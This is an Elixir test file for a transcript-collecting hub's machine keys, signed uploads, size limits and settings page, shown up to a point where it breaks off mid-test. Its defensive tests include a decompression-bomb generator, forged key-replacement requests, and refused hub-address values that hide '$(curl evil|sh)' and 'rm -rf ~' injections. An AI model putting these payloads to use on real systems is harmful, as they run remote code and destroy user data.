defmodule Wallboard.MachineKeysTest do
  use ExUnit.Case, async: false

  alias Wallboard.Archive.{Ingest, MachineKeys, UploadGate}
  alias Wallboard.{Fixtures, Settings, Store, TestHub}
  alias WallboardWeb.SettingsLive

  @sid "9f8651f6-634b-47b7-a4db-b27994e624eb"

  defp tmp_dir do
    dir = Path.join(System.tmp_dir!(), "wallboard-keys-#{System.unique_integer([:positive])}")
    File.mkdir_p!(dir)
    on_exit(fn -> File.rm_rf!(dir) end)
    dir
  end

  # A hub with its archive on, in a throwaway folder.
  defp hub(dir) do
    old = Settings.get()
    on_exit(fn -> :persistent_term.put({Wallboard.Settings, :settings}, old) end)
    start_supervised!({Store, path: ":memory:"})
    url = TestHub.serve()
    # The address the scripts it serves name, as a real hub's settings give it.
    Settings.put(%{archive: %{enabled: true, path: Path.join(dir, "wallboard.db"), hub_url: url}})
    url
  end

  # A .tar.gz that unpacks to about `mb` megabytes of zeros, made small: one
  # megabyte compressed with a full flush comes out the same every time,
  # so it can be repeated. The end of the stream is left off, as unpacking
  # never gets that far.
  defp bomb(mb) do
    z = :zlib.open()
    :ok = :zlib.deflateInit(z, :best_compression, :deflated, 31, 8, :default)
    zeros = :binary.copy(<<0>>, 1_000_000)
    first = IO.iodata_to_binary(:zlib.deflate(z, zeros, :full))
    again = IO.iodata_to_binary(:zlib.deflate(z, zeros, :full))
    :zlib.close(z)
    first <> :binary.copy(again, mb - 1)
  end

  describe "the size limit" do
    test "an upload that would unpack past the limit is refused as it passes it" do
      # About 20 GB unpacked, from about 20 MB: unpacking it all would take
      # more memory than the machine running this test has.
      big = bomb(20_000)
      assert byte_size(big) < 25_000_000
      assert MachineKeys.window() == 300

      {micros, result} = :timer.tc(fn -> Ingest.unpack(big) end)
      assert result == {:error, :too_big}
      # It stopped at the limit, 512 MB in, not 20 GB.
      assert Ingest.max_unpacked() == 512_000_000
      assert micros < 30_000_000
    end

    test "an archive within the limit unpacks, and a cut-short one is refused" do
      files = [{~c"#{@sid}.jsonl", "{}\n"}]
      path = Path.join(tmp_dir(), "up.tgz")
      :ok = :erl_tar.create(String.to_charlist(path), files, [:compressed])
      tgz = File.read!(path)

      assert {:ok, [{name, "{}\n"}]} = Ingest.unpack(tgz)
      assert name == "#{@sid}.jsonl"

      assert Ingest.unpack(binary_part(tgz, 0, div(byte_size(tgz), 2))) ==
               {:error, "not a .tar.gz"}

      assert Ingest.unpack("not gzip at all") == {:error, "not a .tar.gz"}
    end

    test "the hub answers an upload past the limit with 413 and saves nothing" do
      dir = tmp_dir()
      url = hub(dir)
      Application.put_env(:wallboard, :max_unpacked, 5_000_000)
      on_exit(fn -> Application.delete_env(:wallboard, :max_unpacked) end)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "laptop"), "laptop")

      assert Fixtures.signed_post(url, "/ingest/transcript?machine=laptop", bomb(50), id, key) ==
               {"413", "the upload unpacks to more than the hub takes"}

      refute File.exists?(Path.join([dir, "inbox", "laptop"]))
    end
  end

  describe "connecting a machine" do
    setup do
      dir = tmp_dir()
      url = hub(dir)
      claude = Path.join(dir, ".claude")
      codex = Path.join(dir, ".codex")
      File.mkdir_p!(codex)
      install = Path.join(dir, "install.sh")
      File.write!(install, Ingest.install_script(url))
      bin = Path.join(dir, "bin")
      File.mkdir_p!(bin)
      %{dir: dir, url: url, claude: claude, codex: codex, install: install, bin: bin}
    end

    # Runs a script with throwaway home, Claude and Codex folders, never the
    # real ones, and a PATH of the system's own tools after dir/bin.
    defp sh(ctx, args, env, input \\ nil) do
      args = if input, do: ["-c", ~s(sh "$0" < "$1"), hd(args), input], else: args

      System.cmd("sh", args,
        env:
          [
            {"HOME", ctx.dir},
            {"TMPDIR", ctx.dir},
            {"CLAUDE_CONFIG_DIR", ctx.claude},
            {"CODEX_HOME", ctx.codex},
            {"PATH", Enum.join([ctx.bin, "/usr/bin", "/bin", "/usr/sbin", "/sbin"], ":")}
          ] ++ env,
        stderr_to_stdout: true
      )
    end

    defp connect(ctx, key \\ nil),
      do: sh(ctx, [ctx.install], [{"WALLBOARD_KEY", key || MachineKeys.connect_key()}])

    # A Claude session ending, as its Stop hook tells the upload script.
    defp stop_hook(ctx) do
      project = Path.join([ctx.claude, "projects", "app"])
      File.mkdir_p!(project)
      transcript = Path.join(project, "#{@sid}.jsonl")

      File.write!(
        transcript,
        Jason.encode!(%{
          type: "user",
          sessionId: @sid,
          timestamp: "2026-09-30T13:00:00Z",
          message: %{role: "user", content: "hello"}
        }) <> "\n"
      )

      input = Path.join(ctx.dir, "stop.json")

      File.write!(
        input,
        Jason.encode!(%{
          session_id: @sid,
          transcript_path: transcript,
          hook_event_name: "SessionEnd"
        })
      )

      sh(ctx, [Path.join(ctx.claude, "wallboard-upload.sh")], [], input)
    end

    defp saved_machines,
      do: Store.query("SELECT machine FROM sessions", []) |> Enum.map(& &1.machine)

    # The hook hands the send to a run of its own and returns, so the
    # session arrives a moment later.
    defp arrived(tries \\ 100) do
      case saved_machines() do
        [] when tries > 0 ->
          Process.sleep(100)
          arrived(tries - 1)

        machines ->
          machines
      end
    end

    test "gives the machine a key of its own that never crosses the network, and it sends", ctx do
      assert {out, 0} = connect(ctx)
      assert [_, machine] = Regex.run(~r/Connected as (\S+)\./, out)
      assert [%{machine: ^machine, key_id: id, last_used_at: nil}] = MachineKeys.list()

      # The same key beside each upload script, readable only by this user,
      # and neither key written into a script.
      for folder <- [ctx.claude, ctx.codex] do
        file = Path.join(folder, "wallboard-key")

        assert File.read!(file) ==
                 "#{id}\n#{machine}\n#{MachineKeys.derive(MachineKeys.connect_key(), id)}\n"

        assert File.stat!(file).access == :read_write
        assert Bitwise.band(File.stat!(file).mode, 0o077) == 0
        script = File.read!(Path.join(folder, "wallboard-upload.sh"))
        refute script =~ MachineKeys.connect_key()
        refute script =~ MachineKeys.derive(MachineKeys.connect_key(), id)
      end

      assert {"", 0} = stop_hook(ctx)
      assert arrived() == [machine]
      assert [%{last_used_at: used}] = MachineKeys.list()
      assert is_integer(used)
    end

    test "connecting again replaces the machine's key rather than adding one", ctx do
      assert {_, 0} = connect(ctx)
      assert [%{key_id: first}] = MachineKeys.list()
      assert {_, 0} = connect(ctx)
      assert [%{key_id: second}] = MachineKeys.list()
      assert first != second
    end

    test "a wrong connect key changes nothing on the machine", ctx do
      assert {out, 1} = connect(ctx, "not-the-key")
      assert out =~ "did not connect this machine (401): wrong signature"
      assert MachineKeys.list() == []
      refute File.exists?(Path.join(ctx.claude, "wallboard-key"))
      refute File.exists?(Path.join(ctx.claude, "settings.json"))
    end

    test "with no key given and no terminal to ask at, nothing changes", ctx do
      assert {out, 1} = sh(ctx, [ctx.install], [])
      assert out =~ "No connect key"
      assert MachineKeys.list() == []
    end

    test "a key pasted with spaces around it still connects", ctx do
      assert {_, 0} = connect(ctx, "  #{MachineKeys.connect_key()} \n")
      assert [_] = MachineKeys.list()
    end

    test "the command from the settings page runs the script only when it is the hub's", ctx do
      sha = :crypto.hash(:sha256, Ingest.install_script(ctx.url)) |> Base.encode16(case: :lower)
      key = [{"WALLBOARD_KEY", MachineKeys.connect_key()}]

      assert {out, _} =
               sh(
                 ctx,
                 ["-c", SettingsLive.install_command(ctx.url, String.duplicate("0", 64))],
                 key
               )

      assert out =~ "That is not the hub's connect script."
      assert MachineKeys.list() == []

      assert {out, 0} = sh(ctx, ["-c", SettingsLive.install_command(ctx.url, sha)], key)
      assert out =~ "Connected as"
      assert [_] = MachineKeys.list()
    end

    test "each script comes signed with the connect key, for the Mac app to check", ctx do
      for name <- ~w(upload.sh codex-upload.sh install.sh) do
        {out, 0} = System.cmd("curl", ["-s", "-D", "-", "#{ctx.url}/ingest/#{name}"])
        [head, body] = String.split(out, "\r\n\r\n", parts: 2)
        [_, sig] = Regex.run(~r/x-vitalaize-script-signature: ([0-9a-f]{64})/i, head)
        # Its name is signed too, so one script cannot be sent for another.
        assert sig ==
                 MachineKeys.hmac(
                   MachineKeys.connect_key(),
                   "vitalaize script\n#{name}\n" <> body
                 )
      end
    end

    test "without python3 or osascript it stops before the hub lists the machine", ctx do
      for tool <- ~w(dirname od tr cut mktemp cat head date printf rm mv chmod mkdir cp) do
        if path = System.find_executable(tool), do: File.ln_s!(path, Path.join(ctx.bin, tool))
      end

      for tool <- ~w(curl perl) do
        File.ln_s!(System.find_executable(tool), Path.join(ctx.bin, tool))
      end

      {out, 1} =
        System.cmd("sh", [ctx.install],
          env: [
            {"HOME", ctx.dir},
            {"CLAUDE_CONFIG_DIR", ctx.claude},
            {"CODEX_HOME", ctx.codex},
            {"WALLBOARD_KEY", MachineKeys.connect_key()},
            {"PATH", ctx.bin}
          ],
          stderr_to_stdout: true
        )

      assert out =~ "Needs python3"
      assert MachineKeys.list() == []
    end

    test "with no Digest::SHA for perl, python3 signs instead", ctx do
      # A perl that fails, as one without Digest::SHA would.
      File.write!(Path.join(ctx.bin, "perl"), "#!/bin/sh\nexit 2\n")
      File.chmod!(Path.join(ctx.bin, "perl"), 0o755)

      assert {out, 0} = connect(ctx)
      assert out =~ "Connected as"
      assert {"", 0} = stop_hook(ctx)
      assert length(arrived()) == 1
    end

    test "the connect key cannot send sessions, and a machine key cannot connect", ctx do
      {id, key} = Fixtures.connect_machine(Path.join(ctx.dir, "laptop"), "laptop")

      assert {"401", "sign with the connect key"} =
               Fixtures.signed_post(
                 ctx.url,
                 "/ingest/connect?machine=x&key=#{String.duplicate("c", 32)}",
                 "",
                 id,
                 key
               )

      assert {"401", "sign with this machine's key"} =
               Fixtures.signed_post(
                 ctx.url,
                 "/ingest/transcript?machine=laptop",
                 "",
                 "connect",
                 MachineKeys.connect_key()
               )
    end
  end

  describe "signed requests" do
    # A request as the hub sees it, signed at `time` with `key` over the
    # body hash it states (`stated`, the real one unless given).
    defp signed_conn(target, body, key_id, key, time, stated \\ nil) do
      [path, query] = String.split(target, "?")
      nonce = "0123456789abcdef"
      stated = stated || MachineKeys.sha256(body)

      sig =
        MachineKeys.hmac(
          key,
          MachineKeys.message("POST", path, query, time, nonce, {:sha256, stated})
        )

      Plug.Test.conn(:post, target, body)
      |> Plug.Conn.put_req_header("x-vitalaize-key", key_id)
      |> Plug.Conn.put_req_header("x-vitalaize-time", time)
      |> Plug.Conn.put_req_header("x-vitalaize-nonce", nonce)
      |> Plug.Conn.put_req_header("x-vitalaize-content-sha256", stated)
      |> Plug.Conn.put_req_header("x-vitalaize-signature", sig)
    end

    test "the signature is checked before the body, a copy is refused, and a wrong one writes nothing" do
      dir = tmp_dir()
      hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      t = to_string(System.os_time(:second))
      conn = signed_conn("/ingest/status?machine=laptop", "{}", id, key, t)

      # Signed with another key: refused, and nothing is kept.
      wrong = signed_conn("/ingest/status?machine=laptop", "{}", id, String.duplicate("0", 64), t)
      assert {:error, 401, "wrong signature"} = MachineKeys.authenticate(wrong)
      assert Store.query("SELECT * FROM seen_requests", []) == []

      # Taken once, before any body is read; its copy is refused.
      assert {:ok, parts} = MachineKeys.authenticate(conn)
      assert parts.machine == "laptop"
      assert {:error, 401, "this request was already sent once"} = MachineKeys.authenticate(conn)

      # The body must be the one whose hash was signed.
      assert MachineKeys.confirm(parts, MachineKeys.sha256("{}")) == {:ok, "laptop"}

      assert {:error, 400, "the body is not the one that was signed"} =
               MachineKeys.confirm(parts, MachineKeys.sha256("{\"other\":1}"))

      # Signed more than five minutes ago, or claimed past the window.
      old =
        signed_conn(
          "/ingest/status?machine=laptop",
          "{}",
          id,
          key,
          to_string(String.to_integer(t) - 301)
        )

      assert {:error, 401, "request time is more than 5 minutes" <> _} =
               MachineKeys.authenticate(old)

      keep = MachineKeys.keep_nonces()
      assert keep >= MachineKeys.window()
      now = String.to_integer(t)

      assert Store.claim_nonce(id, "bbbb0000bbbb0000", now - keep - 5, MachineKeys.window(), keep) ==
               :stale

      assert Store.claim_nonce(id, "cccc0000cccc0000", now + 400, MachineKeys.window(), keep) ==
               :stale
    end

    test "a machine disconnected while its upload is on the way is refused" do
      dir = tmp_dir()
      hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")

      conn =
        signed_conn(
          "/ingest/status?machine=laptop",
          "{}",
          id,
          key,
          to_string(System.os_time(:second))
        )

      assert {:ok, parts} = MachineKeys.authenticate(conn)
      MachineKeys.revoke(id)

      assert MachineKeys.confirm(parts, MachineKeys.sha256("{}")) ==
               {:error, 401, "this machine's key was taken away"}
    end

    test "a body other than the one signed is refused, and nothing is saved" do
      dir = tmp_dir()
      url = hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")

      assert {"400", "the body is not the one that was signed"} =
               Fixtures.signed_post(url, "/ingest/transcript?machine=laptop", "swapped", id, key,
                 body_sha256: MachineKeys.sha256("the real one")
               )

      assert Store.query("SELECT * FROM sessions", []) == []
    end

    test "a connect request with a form body is refused, so the form cannot change what was signed" do
      dir = tmp_dir()
      url = hub(dir)
      {victim, _} = Fixtures.connect_machine(Path.join(dir, "v"), "victim")
      target = "/ingest/connect?machine=alpha&key=#{String.duplicate("b", 32)}"
      t = to_string(System.os_time(:second))
      nonce = "0123456789abcdef"
      stated = MachineKeys.sha256("")

      sig =
        MachineKeys.hmac(
          MachineKeys.connect_key(),
          MachineKeys.message(
            "POST",
            "/ingest/connect",
            String.split(target, "?") |> List.last(),
            t,
            nonce,
            {:sha256, stated}
          )
        )

      {out, 0} =
        System.cmd("curl", [
          "-s",
          "-w",
          "\n%{http_code}",
          "-H",
          "Content-Type: application/x-www-form-urlencoded",
          "-H",
          "X-Vitalaize-Key: connect",
          "-H",
          "X-Vitalaize-Time: #{t}",
          "-H",
          "X-Vitalaize-Nonce: #{nonce}",
          "-H",
          "X-Vitalaize-Content-SHA256: #{stated}",
          "-H",
          "X-Vitalaize-Signature: #{sig}",
          "--data-binary",
          "machine=victim&replaces=#{victim}",
          url <> target
        ])

      assert out == "send the body as data, not as a form\n\n400"
      assert [%{key_id: ^victim, machine: "victim"}] = MachineKeys.list()
    end

    test "an upload with a wrong signature is refused before its body is read" do
      dir = tmp_dir()
      url = hub(dir)
      {id, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")

      {micros, reply} =
        :timer.tc(fn ->
          Fixtures.signed_post(
            url,
            "/ingest/transcript?machine=laptop",
            :binary.copy("x", 3_000_000),
            id,
            String.duplicate("0", 64)
          )
        end)

      assert reply == {"401", "wrong signature"}
      assert micros < 5_000_000
    end

    test "a connect request with a body is refused" do
      dir = tmp_dir()
      url = hub(dir)

      assert {"413", "a connect request has no body"} =
               Fixtures.signed_post(
                 url,
                 "/ingest/connect?machine=x&key=#{String.duplicate("c", 32)}",
                 "some body",
                 "connect",
                 MachineKeys.connect_key()
               )
    end

    test "a connect that names its own new key as the one it replaces keeps it" do
      dir = tmp_dir()
      hub(dir)
      id = String.duplicate("d", 32)
      assert :ok = MachineKeys.connect("laptop", id, id, MachineKeys.connect_key())
      assert [%{key_id: ^id}] = MachineKeys.list()
    end
  end

  describe "upload limits" do
    test "two signed uploads run at once, the rest wait their turn, and a dead one gives its place back" do
      start_supervised!(UploadGate)
      parent = self()

      run = fn name, wait ->
        spawn(fn ->
          result =
            UploadGate.run(
              fn ->
                send(parent, {:started, name, self()})

                receive do
                  :done -> :ok
                end
              end,
              wait
            )

          send(parent, {:finished, name, result})
        end)
      end

      _ = run.(:a, 5_000)
      _ = run.(:b, 5_000)
      _ = run.(:c, 5_000)

      started =
        for _ <- 1..2 do
          assert_receive {:started, name, pid}
          {name, pid}
        end

      refute_receive {:started, _, _}, 200

      # One finishes: the one waiting starts.
      [{first, pid} | _] = started
      send(pid, :done)
      assert_receive {:finished, ^first, {:ok, :ok}}
      assert_receive {:started, third, third_pid}
      refute third in Enum.map(started, &elem(&1, 0))

      # One dies inside: its place is given back.
      [{_, other} | _] = tl(started)
      Process.exit(other, :kill)
      _ = run.(:d, 5_000)
      assert_receive {:started, :d, d_pid}

      # With both places taken, one that waits too long is told to come again.
      _ = run.(:e, 100)
      assert_receive {:finished, :e, {:error, :busy}}, 1_000

      send(third_pid, :done)
      send(d_pid, :done)
    end

    test "the board does not speak HTTP/2, where a body could run past its length and deadline" do
      assert Wallboard.Application.http_options(4747)[:http_2_options] == [enabled: false]

      dir = tmp_dir()
      url = hub(dir)

      {out, _} =
        System.cmd("curl", [
          "-s",
          "-o",
          "/dev/null",
          "-w",
          "%{http_version}",
          "--http2-prior-knowledge",
          url <> "/ingest/upload.sh"
        ])

      refute out == "2"
    end

    test "an upload that does not say its length is refused before it is read" do
      dir = tmp_dir()
      url = hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      t = to_string(System.os_time(:second))
      nonce = "0123456789abcdef"
      stated = MachineKeys.sha256("x")

      sig =
        MachineKeys.hmac(
          key,
          MachineKeys.message(
            "POST",
            "/ingest/transcript",
            "machine=laptop",
            t,
            nonce,
            {:sha256, stated}
          )
        )

      {out, 0} =
        System.cmd("curl", [
          "-s",
          "-w",
          "\n%{http_code}",
          "-H",
          "Transfer-Encoding: chunked",
          "-H",
          "Content-Type: application/gzip",
          "-H",
          "X-Vitalaize-Key: #{id}",
          "-H",
          "X-Vitalaize-Time: #{t}",
          "-H",
          "X-Vitalaize-Nonce: #{nonce}",
          "-H",
          "X-Vitalaize-Content-SHA256: #{stated}",
          "-H",
          "X-Vitalaize-Signature: #{sig}",
          "--data-binary",
          "x",
          url <> "/ingest/transcript?machine=laptop"
        ])

      assert out == "say how long the upload is\n\n411"
    end

    # A hub that gives the replies in `agent` in turn ({status, then}, `then`
    # run before replying), then 200, and tells the test each body it got.
    defmodule Replies do
      @behaviour Plug
      import Plug.Conn

      def init(opts), do: opts

      def call(conn, %{agent: agent, test: test}) do
        {:ok, body, conn} = read_body(conn, length: 10_000_000)

        {status, then} =
          Agent.get_and_update(agent, fn
            [next | rest] -> {next, rest}
            [] -> {{200, nil}, []}
          end)

        send(test, {:try, body, get_req_header(conn, "x-vitalaize-nonce")})
        if then, do: then.()
        send_resp(conn, status, "reply\n")
      end
    end

    defp replies(list) do
      {:ok, agent} = Agent.start_link(fn -> list end)
      TestHub.serve({Replies, %{agent: agent, test: self()}})
    end

    test "a collector tries again when the hub is busy, slow or failing, signing each try afresh" do
      dir = tmp_dir()
      hub = replies([{503, nil}, {408, nil}, {500, nil}, {502, nil}])
      script = Path.join(dir, "upload.sh")
      Fixtures.write_key(dir, String.duplicate("a", 32), "laptop", String.duplicate("b", 64))

      # The helpers from the Claude script, run on their own, with a pack
      # step that packs something new each time.
      File.write!(script, """
      #!/bin/sh
      HUB='#{hub}'
      #{Ingest.signing()}
      load_key || exit 3
      n=0
      pack() { n=$((n + 1)); printf 'try %s' "$n" > "$1"; }
      send_upload "/ingest/transcript?machine=laptop" pack "#{dir}/up.tgz"
      """)

      # Four failures, and a fifth try would be past the three waits.
      assert {_, 1} = System.cmd("sh", [script], env: [{"WALLBOARD_RETRY_WAITS", "0 0 0"}])

      nonces =
        for n <- 1..4 do
          assert_receive {:try, body, [nonce]}
          assert body == "try #{n}"
          nonce
        end

      refute_receive {:try, _, _}, 200
      assert length(Enum.uniq(nonces)) == 4

      # A refusal that trying again cannot fix ends it.
      hub = replies([{422, nil}])
      File.write!(script, String.replace(File.read!(script), ~r/HUB='[^']*'/, "HUB='#{hub}'"))
      assert {_, 0} = System.cmd("sh", [script], env: [{"WALLBOARD_RETRY_WAITS", "0 0 0"}])
      assert_receive {:try, "try 1", _}
      refute_receive {:try, _, _}, 200
    end

    test "a transcript sent again carries what was written meanwhile, never an older copy" do
      dir = tmp_dir()
      folder = Path.join(dir, "project")
      File.mkdir_p!(folder)
      transcript = Path.join(folder, "#{@sid}.jsonl")
      File.write!(transcript, "{\"turn\":1}\n")

      # The first try finds the hub busy, and the session goes on meanwhile.
      hub = replies([{503, fn -> File.write!(transcript, "{\"turn\":2}\n", [:append]) end}])
      script = Path.join(dir, "upload.sh")
      File.write!(script, Ingest.upload_script(hub))
      Fixtures.write_key(dir, String.duplicate("a", 32), "laptop", String.duplicate("b", 64))

      assert {_, 0} =
               System.cmd(
                 "sh",
                 [script, "--send", folder, @sid, "/ingest/transcript?machine=laptop"],
                 env: [{"WALLBOARD_RETRY_WAITS", "0 0 0"}, {"TMPDIR", dir}]
               )

      assert_receive {:try, first, _}
      assert_receive {:try, second, _}
      assert {:ok, [{_, "{\"turn\":1}\n"}]} = Ingest.unpack(first)
      assert {:ok, [{_, "{\"turn\":1}\n{\"turn\":2}\n"}]} = Ingest.unpack(second)
      # Nothing left behind.
      assert Path.wildcard(Path.join(dir, "wallboard.*")) == []
    end

    test "curl waits longer than the hub's queue and read time together" do
      assert Ingest.curl_max_time() >
               UploadGate.wait_seconds() + MachineKeys.upload_deadline()

      for script <- [
            Ingest.upload_script("http://h:4747"),
            Ingest.codex_upload_script("http://h:4747")
          ] do
        assert script =~ "--max-time #{Ingest.curl_max_time()}"
        refute script =~ "MAX_TIME"
      end
    end

    test "a refused request closes the connection instead of reading the rest of its body" do
      dir = tmp_dir()
      "http://127.0.0.1:" <> port = hub(dir)

      {:ok, s} =
        :gen_tcp.connect(~c"127.0.0.1", String.to_integer(port), [:binary, active: false])

      :ok =
        :gen_tcp.send(
          s,
          "POST /ingest/transcript?machine=laptop HTTP/1.1\r\nHost: hub\r\n" <>
            "Content-Type: application/gzip\r\nContent-Length: 8000000\r\n\r\n" <>
            :binary.copy("x", 1000)
        )

      # Read to the end: a connection kept open would wait here.
      reply = recv_all(s, "")
      assert reply =~ "HTTP/1.1 401"
      assert reply =~ ~r/connection: close/i
      assert reply =~ "unsigned request"
    end

    test "the board reads no form out of an /ingest body, and refuses one" do
      form = fn path ->
        Plug.Test.conn(:post, path, "machine=victim")
        |> Plug.Conn.put_req_header("content-type", "application/x-www-form-urlencoded")
        |> WallboardWeb.Endpoint.parse_body([])
      end

      assert %Plug.Conn.Unfetched{} = form.("/ingest/connect").body_params
      assert form.("/settings").body_params == %{"machine" => "victim"}
    end

    test "an upload is unpacked in a folder only this user can open, and nothing stays there" do
      dir = tmp_dir()
      url = hub(dir)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      incoming = Path.join(dir, "incoming")

      # One left by a board that stopped mid-upload goes at the next start.
      File.mkdir_p!(incoming)
      File.write!(Path.join(incoming, "up-left"), "x")
      stop_supervised!(UploadGate)
      start_supervised!({UploadGate, incoming: incoming})
      assert File.ls!(incoming) == []

      files = [{~c"#{@sid}.jsonl", "{}\n"}]
      tgz = Path.join(dir, "up.tgz")
      :ok = :erl_tar.create(String.to_charlist(tgz), files, [:compressed])

      assert {"200", "saved"} =
               Fixtures.signed_post(
                 url,
                 "/ingest/transcript?machine=laptop",
                 File.read!(tgz),
                 id,
                 key
               )

      assert Bitwise.band(File.stat!(incoming).mode, 0o777) == 0o700
      assert File.ls!(incoming) == []
    end

    test "an upload larger as sent than the hub takes is refused before it is read" do
      dir = tmp_dir()
      url = hub(dir)
      Application.put_env(:wallboard, :max_upload, 1000)
      on_exit(fn -> Application.delete_env(:wallboard, :max_upload) end)
      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")

      assert Fixtures.signed_post(
               url,
               "/ingest/transcript?machine=laptop",
               :binary.copy("x", 2000),
               id,
               key
             ) == {"413", "upload too large"}
    end
  end

  defp recv_all(s, acc) do
    case :gen_tcp.recv(s, 0, 3_000) do
      {:ok, data} -> recv_all(s, acc <> data)
      {:error, :closed} -> acc
      {:error, :timeout} -> flunk("the connection stayed open after: #{inspect(acc)}")
    end
  end

  describe "the settings page" do
    defp page(local? \\ true, keys? \\ true) do
      socket = %Phoenix.LiveView.Socket{
        assigns: %{
          __changed__: %{},
          allowed?: true,
          local?: local?,
          keys?: local? and keys?,
          connected?: true,
          errors: %{},
          notice: nil,
          restart?: false,
          show_key?: false,
          confirm_new_key?: false,
          confirm_disconnect: nil,
          flash: %{}
        }
      }

      # What mounting does for a live connection from this Mac.
      SettingsLive.load(socket)
    end

    defp html(socket),
      do:
        socket.assigns
        |> SettingsLive.render()
        |> Phoenix.HTML.Safe.to_iodata()
        |> IO.iodata_to_binary()

    test "disconnecting one machine leaves the others connected" do
      dir = tmp_dir()
      hub(dir)
      {laptop, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      {desk, _} = Fixtures.connect_machine(Path.join(dir, "b"), "desk")

      socket = page()
      assert html(socket) =~ "laptop"
      assert html(socket) =~ "desk"

      # The first tap only asks to be sure.
      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert length(MachineKeys.list()) == 2
      assert html(socket) =~ "Tap again to disconnect"

      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert [%{key_id: ^desk, machine: "desk"}] = MachineKeys.list()
      assert socket.assigns.notice =~ "laptop is disconnected"
    end

    test "the connect command holds no key, and machines on the old key are listed" do
      dir = tmp_dir()
      hub(dir)
      Store.put_session(%{machine: "old-mac", session_id: @sid})
      MachineKeys.note_old_try("old-mac")
      # A name the board has never had sessions from is not listed.
      MachineKeys.note_old_try("made-up")
      page = html(page())

      assert page =~ "Machines to connect again"
      assert page =~ "old-mac"
      refute page =~ "made-up"
      refute page =~ MachineKeys.connect_key()
      refute SettingsLive.install_command("http://hub:4747", "abc") =~ MachineKeys.connect_key()
    end

    test "a new connect key disconnects every machine, since its old one may have been seen" do
      dir = tmp_dir()
      hub(dir)
      Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      Fixtures.connect_machine(Path.join(dir, "b"), "desk")
      old = MachineKeys.connect_key()

      {:noreply, socket} = SettingsLive.handle_event("new_key", %{}, page())
      assert length(MachineKeys.list()) == 2
      {:noreply, socket} = SettingsLive.handle_event("new_key", %{}, socket)

      assert MachineKeys.list() == []
      assert MachineKeys.connect_key() != old
      assert socket.assigns.notice =~ "every machine disconnected"
    end

    test "the hub address takes only a plain address, and only this Mac may change it" do
      dir = tmp_dir()
      hub(dir)

      for bad <- [
            "http://h:4747/$(curl evil|sh)",
            ~s(http://h:4747"; rm -rf ~; "),
            "http://h:4747\nexit",
            "http://h:4747/x?y=1",
            "http://h:4747/it's",
            "ftp://h"
          ] do
        refute Settings.hub_url?(bad), bad
      end

      for good <- [
            "http://192.168.1.20:4747",
            "https://hub.local",
            "http://[fe80::1]:4747/",
            "https://box.local/wallboard"
          ] do
        assert Settings.hub_url?(good), good
      end

      socket = page(false)
      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
      # What the page saves, kept in the database.
      saved = fn -> Store.get_meta("settings_overrides") || "" end
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      refute saved.() =~ "10.0.0.9"

      socket = page(true)
      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      assert saved.() =~ "http://10.0.0.9:4747"
    end

    test "on this Mac too, the key and the address need the board's password" do
      dir = tmp_dir()
      hub(dir)
      {laptop, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      # This Mac, but no password: any account on it could be here.
      socket = page(true, false)

      for event <- ~w(toggle_key new_key) do
        assert {:noreply, ^socket} = SettingsLive.handle_event(event, %{}, socket)
      end

      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert [_] = MachineKeys.list()

      page = html(socket)
      assert page =~ "Give the board a password first"
      refute page =~ "/ingest/install.sh"
      refute page =~ MachineKeys.connect_key()
      refute page =~ ~s(phx-click="disconnect")

      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      refute (Store.get_meta("settings_overrides") || "") =~ "10.0.0.9"
    end

    test "the first board password comes from the settings file, but the page can change it" do
      dir = tmp_dir()
      hub(dir)
      saved = fn -> Store.get_meta("settings_overrides") || "" end

      # No password yet: whoever opened the page could set one and see the key.
      socket = page(true, false)
      values = Map.put(socket.assigns.values, "token", "chosen-here")
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      refute saved.() =~ "chosen-here"
      assert Settings.get().token == nil

      Settings.put(Map.put(Settings.get(), :token, "from-the-file"))
      socket = page(true, true)
      values = Map.put(socket.assigns.values, "token", "changed-here")
      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
      assert saved.() =~ "changed-here"
    end

    test "a visit a proxy passed on never counts as this Mac" do
      assert SettingsLive.proxied?([{"x-forwarded-for", "203.0.113.9"}])
      assert SettingsLive.proxied?([{"X-Real-IP", "203.0.113.9"}])
      refute SettingsLive.proxied?([{"x-requested-with", "XMLHttpRequest"}])
      refute SettingsLive.proxied?([])
      refute SettingsLive.proxied?(nil)
    end

    test "another device, even with the board's password, cannot see the key or disconnect" do
      dir = tmp_dir()
      hub(dir)
      {laptop, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
      socket = page(false)

      for event <- ~w(toggle_key new_key) do
        assert {:noreply, ^socket} = SettingsLive.handle_event(event, %{}, socket)
      end

      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
      assert [_] = MachineKeys.list()

      page = html(socket)
      assert page =~ "Open this page on the Mac that runs the board"
      # Not even the command: coming over plain http, its check could have
      # been changed on the way.
      refute page =~ "/ingest/install.sh"
      refute page =~ ~s(phx-click="disconnect")
